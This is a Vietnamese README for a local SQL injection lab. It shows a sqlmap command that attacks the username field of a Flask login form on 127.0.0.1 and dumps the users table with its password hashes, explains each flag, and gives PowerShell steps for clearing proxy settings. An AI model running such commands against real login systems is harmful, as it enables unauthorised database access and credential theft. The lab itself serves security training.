# SQLi Lab: Khai thác lỗ hổng đăng nhập với SQLMap

Lab này mô phỏng một hệ thống đăng nhập sử dụng Python (Flask) và MySQL (XAMPP). Form đăng nhập chứa lỗ hổng SQL Injection tại tham số `username`. Mục tiêu của lab là sử dụng công cụ `sqlmap` để phát hiện lỗ hổng và dump toàn bộ dữ liệu của bảng `users` (bao gồm mật khẩu đã bị băm).

---

## 1. Môi trường & Chuẩn bị
* **Ứng dụng Web:** Chạy bằng Python Flask tại `http://127.0.0.1:3667`
* **Database:** MySQL (chạy qua XAMPP), tên database: `lab_sqli`, tên bảng: `users`.
* **Công cụ tấn công:** `sqlmap` (chạy trên PowerShell / Terminal).

---

## 2. Quá trình Khai thác (Exploitation)

Câu lệnh chuẩn nhất để tấn công trực tiếp vào form đăng nhập và kéo dữ liệu bảng `users`:

```bash
python sqlmap.py -u "[http://127.0.0.1:3667/login](http://127.0.0.1:3667/login)" --data="username=123&password=321" -p username -D lab_sqli -T users --dump --batch --flush-session
```
## Giải thích các cờ (flags) quan trọng:
* `-u`: URL mục tiêu
* `--data="..."`: Báo cho sqlmap biết đây là request POST.
* `-p username`: Tập trung tấn công vào `username`
* `-D lab_sqli -T users`: Hỗ trợ sqlmap tập trung tìm bảng 
* `--dump`: Trích xuất dữ liệu bảng
* `--batch`: Tự động trả lời mặc định
* `--flush-session`: Xóa cache của các lần quét cũ bị lỗi, bắt đầu quét lại từ trạng thái sạch.
---

## 3. Lỗi thường gặp

### Bị vướng Proxy của hệ thống:

Cách fix: Xóa sạch các biến môi trường proxy trong CHÍNH CỬA SỔ POWERSHELL ĐANG CHẠY SQLMAP. Copy và dán cụm lệnh này vào PowerShell rồi ấn Enter:
```powershell
$env:NO_PROXY="127.0.0.1,localhost"
$env:http_proxy=""
$env:https_proxy=""
$env:HTTP_PROXY=""
$env:HTTPS_PROXY=""
$env:ALL_PROXY=""
```

## Vid:
<video controls src="images/demo.mp4" title="Title"></video>